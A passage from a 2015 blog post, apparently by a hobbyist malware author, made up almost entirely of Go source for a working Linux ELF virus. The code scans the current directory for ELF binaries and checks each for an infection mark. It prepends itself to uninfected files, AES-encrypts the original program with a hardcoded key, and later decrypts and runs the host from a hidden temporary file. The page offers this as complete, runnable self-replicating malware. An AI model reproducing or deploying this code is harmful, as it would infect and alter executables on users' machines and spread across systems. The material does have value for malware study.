<span class="kd">func</span> <span class="nf">CheckInfected</span><span class="p">(</span><span class="nx">file</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>

    <span class="nx">_mark</span> <span class="o">:=</span> <span class="s">&#34;=TMZ=&#34;</span> <span class="c1">//infection mark
</span><span class="c1"></span> 	<span class="nx">fi</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
	<span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="nx">myStat</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">fi</span><span class="p">.</span><span class="nf">Stat</span><span class="p">()</span>
	<span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>	
	<span class="nx">size</span> <span class="o">:=</span> <span class="nx">myStat</span><span class="p">.</span><span class="nf">Size</span><span class="p">()</span>
	
	<span class="nx">buf</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span>
	<span class="nx">fi</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
	<span class="nx">fi</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
	<span class="kd">var</span> <span class="nx">x</span> <span class="kt">int64</span>
	<span class="k">for</span> <span class="nx">x</span> <span class="p">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">x</span> <span class="p">&lt;</span> <span class="nx">size</span><span class="p">;</span> <span class="nx">x</span><span class="o">++</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">buf</span><span class="p">[</span><span class="nx">x</span><span class="p">]</span> <span class="o">==</span> <span class="nx">_mark</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">y</span> <span class="kt">int64</span>           
            <span class="k">for</span> <span class="nx">y</span> <span class="p">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">y</span> <span class="p">&lt;</span> <span class="nb">int64</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">_mark</span><span class="p">));</span> <span class="nx">y</span><span class="o">++</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">y</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">size</span> <span class="p">{</span>
                        <span class="k">break</span>
					<span class="p">}</span>
                    <span class="k">if</span> <span class="nx">buf</span><span class="p">[</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">y</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">_mark</span><span class="p">[</span><span class="nx">y</span><span class="p">]</span> <span class="p">{</span>
                            <span class="k">break</span>
					<span class="p">}</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="nx">y</span> <span class="o">==</span> <span class="nb">int64</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">_mark</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">//infected!
</span><span class="c1"></span>                <span class="p">}</span>
			<span class="p">}</span>
		<span class="p">}</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">//not infected
</span><span class="c1"></span>    
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Infect</span><span class="p">(</span><span class="nx">file</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>

	<span class="nx">dat</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="c1">//read host
</span><span class="c1"></span>	<span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>	
	<span class="nx">vir</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="c1">//read virus
</span><span class="c1"></span>	<span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="nx">virbuf</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">1666208</span><span class="p">)</span>
	<span class="nx">vir</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">virbuf</span><span class="p">)</span>
	
	<span class="nx">encDat</span> <span class="o">:=</span> <span class="nf">Encrypt</span><span class="p">(</span><span class="nx">dat</span><span class="p">)</span> <span class="c1">//encrypt host
</span><span class="c1"></span>	
	<span class="nx">f</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">OpenFile</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">O_RDWR</span><span class="p">,</span> <span class="mo">0666</span><span class="p">)</span> <span class="c1">//open host
</span><span class="c1"></span>	<span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	
  	<span class="nx">w</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nf">NewWriter</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
	<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">virbuf</span><span class="p">)</span> <span class="c1">//write virus
</span><span class="c1"></span>	<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">encDat</span><span class="p">)</span> <span class="c1">//write encypted host
</span><span class="c1"></span>	<span class="nx">w</span><span class="p">.</span><span class="nf">Flush</span><span class="p">()</span> <span class="c1">//make sure we are all set
</span><span class="c1"></span>	<span class="nx">f</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
	<span class="nx">vir</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
<span class="p">}</span>
   
<span class="kd">func</span> <span class="nf">RunHost</span><span class="p">()</span> <span class="p">{</span>
    
    <span class="nx">hostbytes</span> <span class="o">:=</span> <span class="s">&#34;.&#34;</span> <span class="o">+</span> <span class="nf">Rnd</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1">//generate hidden random name
</span><span class="c1"></span>    
    <span class="nx">h</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="nx">hostbytes</span><span class="p">)</span> <span class="c1">//create tmp with above name
</span><span class="c1"></span>    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    
    <span class="nx">infected_data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="c1">//Read myself
</span><span class="c1"></span>    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="nx">allSZ</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="nx">infected_data</span><span class="p">)</span> <span class="c1">//get file full size
</span><span class="c1"></span>    <span class="nx">hostSZ</span> <span class="o">:=</span> <span class="nx">allSZ</span> <span class="o">-</span> <span class="mi">1666208</span> <span class="c1">//calculate host size
</span><span class="c1"></span>    
    <span class="nx">f</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="c1">//open host
</span><span class="c1"></span>    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        
    <span class="nx">f</span><span class="p">.</span><span class="nf">Seek</span><span class="p">(</span><span class="mi">1666208</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">SEEK_SET</span><span class="p">)</span> <span class="c1">//go to host start
</span><span class="c1"></span>    
    <span class="nx">hostBuf</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">hostSZ</span><span class="p">)</span>
    <span class="nx">f</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">hostBuf</span><span class="p">)</span> <span class="c1">//read it
</span><span class="c1"></span>
    <span class="nx">plainHost</span> <span class="o">:=</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="nx">hostBuf</span><span class="p">)</span> <span class="c1">//decrypt host
</span><span class="c1"></span>
    <span class="nx">w</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nf">NewWriter</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>
    <span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">plainHost</span><span class="p">)</span> <span class="c1">//write plain host to tmp file
</span><span class="c1"></span>    <span class="nx">w</span><span class="p">.</span><span class="nf">Flush</span><span class="p">()</span> <span class="c1">//make sure we are all set
</span><span class="c1"></span>    <span class="nx">h</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    <span class="nx">f</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    
    <span class="nx">os</span><span class="p">.</span><span class="nf">Chmod</span><span class="p">(</span><span class="nx">hostbytes</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span> <span class="c1">//give it proper permissions
</span><span class="c1"></span>    <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;./&#34;</span> <span class="o">+</span> <span class="nx">hostbytes</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
    <span class="nx">os</span><span class="p">.</span><span class="nf">Remove</span><span class="p">(</span><span class="nx">hostbytes</span><span class="p">)</span>
<span class="p">}</span>
 
<span class="kd">func</span> <span class="nf">Encrypt</span><span class="p">(</span><span class="nx">toEnc</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
    
    <span class="nx">key</span> <span class="o">:=</span> <span class="s">&#34;SUPER_SECRET_KEY&#34;</span> <span class="c1">// 16 bytes!
</span><span class="c1"></span>    <span class="nx">block</span><span class="p">,</span><span class="nx">err</span> <span class="o">:=</span> <span class="nx">aes</span><span class="p">.</span><span class="nf">NewCipher</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    
    <span class="c1">// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
</span><span class="c1"></span>    <span class="nx">ciphertext</span> <span class="o">:=</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;ASUPER_SECRET_IV&#34;</span><span class="p">)</span> 
    <span class="nx">iv</span> <span class="o">:=</span> <span class="nx">ciphertext</span><span class="p">[:</span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="p">]</span> <span class="c1">// const BlockSize = 16
</span><span class="c1"></span>    
    <span class="nx">encrypter</span> <span class="o">:=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nf">NewCFBEncrypter</span><span class="p">(</span><span class="nx">block</span><span class="p">,</span> <span class="nx">iv</span><span class="p">)</span>

    <span class="nx">encrypted</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nx">toEnc</span><span class="p">))</span>
    <span class="nx">encrypter</span><span class="p">.</span><span class="nf">XORKeyStream</span><span class="p">(</span><span class="nx">encrypted</span><span class="p">,</span> <span class="nx">toEnc</span><span class="p">)</span>

    <span class="c1">//fmt.Printf(&#34;%s encrypted to %v\n&#34;, toEnc, encrypted)
</span><span class="c1"></span>    <span class="k">return</span> <span class="nx">encrypted</span>
    
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="nx">toDec</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>

    <span class="nx">key</span> <span class="o">:=</span> <span class="s">&#34;SUPER_SECRET_KEY&#34;</span> <span class="c1">// 16 bytes
</span><span class="c1"></span>    <span class="nx">block</span><span class="p">,</span><span class="nx">err</span> <span class="o">:=</span> <span class="nx">aes</span><span class="p">.</span><span class="nf">NewCipher</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    
    <span class="c1">// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
</span><span class="c1"></span>    <span class="nx">ciphertext</span> <span class="o">:=</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;ASUPER_SECRET_IV&#34;</span><span class="p">)</span> 
    <span class="nx">iv</span> <span class="o">:=</span> <span class="nx">ciphertext</span><span class="p">[:</span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="p">]</span> <span class="c1">// const BlockSize = 16
</span><span class="c1"></span>    
    <span class="nx">decrypter</span> <span class="o">:=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nf">NewCFBDecrypter</span><span class="p">(</span><span class="nx">block</span><span class="p">,</span> <span class="nx">iv</span><span class="p">)</span> <span class="c1">// simple
</span><span class="c1"></span>
    <span class="nx">decrypted</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nx">toDec</span><span class="p">))</span>
    <span class="nx">decrypter</span><span class="p">.</span><span class="nf">XORKeyStream</span><span class="p">(</span><span class="nx">decrypted</span><span class="p">,</span> <span class="nx">toDec</span><span class="p">)</span>
   
    <span class="k">return</span> <span class="nx">decrypted</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Rnd</span><span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
    
    <span class="nx">rand</span><span class="p">.</span><span class="nf">Seed</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">UnixNano</span><span class="p">())</span>
    <span class="kd">var</span> <span class="nx">letters</span> <span class="p">=</span> <span class="p">[]</span><span class="nb">rune</span><span class="p">(</span><span class="s">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">)</span>
    <span class="nx">b</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">rune</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span>
    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">b</span> <span class="p">{</span>
        <span class="nx">b</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">=</span> <span class="nx">letters</span><span class="p">[</span><span class="nx">rand</span><span class="p">.</span><span class="nf">Intn</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">letters</span><span class="p">))]</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>

<span class="p">}</span>

<span class="kd">func</span> <span class="nf">GetSz</span><span class="p">(</span><span class="nx">file</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">int64</span> <span class="p">{</span>

    <span class="nx">myHnd</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="k">defer</span> <span class="nx">myHnd</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    <span class="nx">myStat</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">myHnd</span><span class="p">.</span><span class="nf">Stat</span><span class="p">()</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="nx">mySZ</span> <span class="o">:=</span> <span class="nx">myStat</span><span class="p">.</span><span class="nf">Size</span><span class="p">()</span>
    <span class="nx">myHnd</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    <span class="k">return</span> <span class="nx">mySZ</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    
    <span class="nx">virPath</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

	<span class="nx">files</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadDir</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">)</span>
	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">files</span> <span class="p">{</span>
		<span class="k">if</span> <span class="nf">CheckELF</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span> <span class="o">==</span> <span class="kc">true</span> <span class="p">{</span>
			<span class="k">if</span> <span class="nf">CheckInfected</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span> <span class="o">==</span> <span class="kc">false</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">virPath</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span> <span class="p">{</span>
					<span class="nf">Infect</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
				<span class="p">}</span>	
			<span class="p">}</span>	
		<span class="p">}</span>
	<span class="p">}</span>

        
    <span class="k">if</span> <span class="nf">GetSz</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">&gt;</span> <span class="mi">1666208</span> <span class="p">{</span>
        <span class="nf">RunHost</span><span class="p">()</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">}</span>
	
<span class="p">}</span></code></pre></div>

<p>Simple enough! Go is a quite fun language, I&rsquo;ll keep it in mind for future projects.</p>

<p>TMZ</p>

    </div>
    	
      <article>	
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "guitmz" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>	
      </article>	
    
    <footer>
      <hr>
      <p>
  Published
  
    
      by <span itemprop="author">Guilherme Thomazi</span>
    
  
  <time itemprop="datePublished" datetime="2015-05-15T16:54:23&#43;02:00">
    15 May, 2015
  </time>
  
  
    and tagged <a rel="tag" href="/tags/elf/">elf</a>, <a rel="tag" href="/tags/go/">go</a>, <a rel="tag" href="/tags/golang/">golang</a>, <a rel="tag" href="/tags/linux/">linux</a>, <a rel="tag" href="/tags/malware/">malware</a> and <a rel="tag" href="/tags/virus/">virus</a>
  
  using <span itemprop="wordCount">859</span> words.
</p>

      


  <aside>
    <header>Related Content</header>
    <ul>
      
        <li><a href="/vala-virus/">Linux.Zariche: a Vala virus</a>
        <time datetime="9M">9 minutes</time>
      
    </ul>
  </aside>


    </footer>
  </article>
</main>
    <footer>
  

  
  <small class="muted">
    This site does not use
    <svg aria-hidden="true" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="12" height="12"><path fill="currentColor" d="M510.52 255.82c-69.97-.85-126.47-57.69-126.47-127.86-70.17 0-127-56.49-127.86-126.45-27.26-4.14-55.13.3-79.72 12.82l-69.13 35.22a132.221 132.221 0 0 0-57.79 57.81l-35.1 68.88a132.645 132.645 0 0 0-12.82 80.95l12.08 76.27a132.521 132.521 0 0 0 37.16 72.96l54.77 54.76a132.036 132.036 0 0 0 72.71 37.06l76.71 12.15c27.51 4.36 55.7-.11 80.53-12.76l69.13-35.21a132.273 132.273 0 0 0 57.79-57.81l35.1-68.88c12.56-24.64 17.01-52.58 12.91-79.91zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path></svg>
    cookies.
  </small>


</footer>
    
    
    
    <script>fetchInject([
        "https://cdn.jsdelivr.net/npm/baffle@0.3.6/dist/baffle.min.js"
      ]).then(() => {
        baffle(document.querySelector('h1')).start().reveal(1500);
      })
    </script>
  </body>
</html>
